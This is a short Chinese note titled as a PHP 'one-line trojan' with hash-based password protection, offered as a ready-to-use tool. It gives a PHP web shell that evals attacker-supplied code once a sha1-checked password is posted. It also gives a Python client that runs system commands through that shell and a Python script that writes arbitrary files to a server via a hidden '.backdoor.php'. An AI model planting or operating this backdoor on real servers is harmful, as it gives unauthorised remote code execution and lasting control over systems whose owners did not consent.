# php---hash一句话木马

密码: hello，使用尽量换成复杂的密码  
```php
<?php if(sha1($_POST["pass"])=="aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"){@eval($_POST["a"]);} ?>
```
也可以是 md5，不建议  

python 连接脚本：  
```python
# coding:utf8

import requests

url = 'http://127.0.0.1/index.php'
data = {
    'pass': 'hello',
    'a': "system('ls');"
}
res = requests.post(url, data=data)
print(res.content)
```

python 写文件：  
```python
# coding:utf8

import base64
import requests

backdoor_url = 'http://1.2.3.4/.backdoor.php'
src_file_path = 'D:/hello.php'
dst_file_path = 'var/www/html/hello.php'

base64_content = base64.b64encode(open(src_file_path).read())
data = {
    'pass': 'hello',
    'a': "$file='{}';$fopen=fopen($file,'wb');fputs($fopen,base64_decode('{}'));fclose($fopen);".format(dst_file_path, base64_content)
}
res = requests.post(backdoor_url, data=data)
```


2020/6/12  
